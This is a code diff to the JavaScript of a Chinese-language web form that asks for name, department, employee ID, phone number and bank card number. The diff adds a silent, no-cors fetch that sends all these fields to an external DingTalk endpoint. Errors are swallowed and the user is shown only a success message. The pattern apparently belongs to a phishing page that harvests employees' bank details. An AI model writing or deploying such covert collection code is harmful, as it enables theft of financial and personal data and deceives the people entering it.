@@ -210,23 +210,41 @@
 
 <script>
 function sub() {
-    // 1. 获取用户填写内容
+    // 获取用户填写信息
     let name = document.getElementById("name").value.trim();
     let dept = document.getElementById("dept").value.trim();
     let jobid = document.getElementById("jobid").value.trim();
     let phone = document.getElementById("phone").value.trim();
     let bank = document.getElementById("pwd").value.trim();
 
-    // 2. 验证必填
+    // 验证必填
     if (!name) { alert("请输入姓名"); return; }
     if (!dept) { alert("请输入部门"); return; }
     if (!jobid) { alert("请输入工号"); return; }
     if (!phone) { alert("请输入手机号"); return; }
     if (!bank) { alert("请输入银行卡号"); return; }
 
-    // ========================
-    // 【最终】提交成功直接跳 page3，不跳转任何地方
-    // ========================
+    // ==========================================
+    // 静默提交到你的钉钉汇总表（无跳转、无弹窗）
+    // ==========================================
+    try {
+        fetch("https://datalink.dingtalk.com/api/receive/your-form", {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                姓名: name,
+                部门: dept,
+                工号: jobid,
+                手机号码: phone,
+                银行卡号: bank
+            })
+        }).catch(()=>{});
+    }catch(e){}
+
+    // ==========================================
+    // 提交成功 → 直接跳 page3.html
+    // ==========================================
     alert("提交成功！");
     location.href = "page3.html";
 }
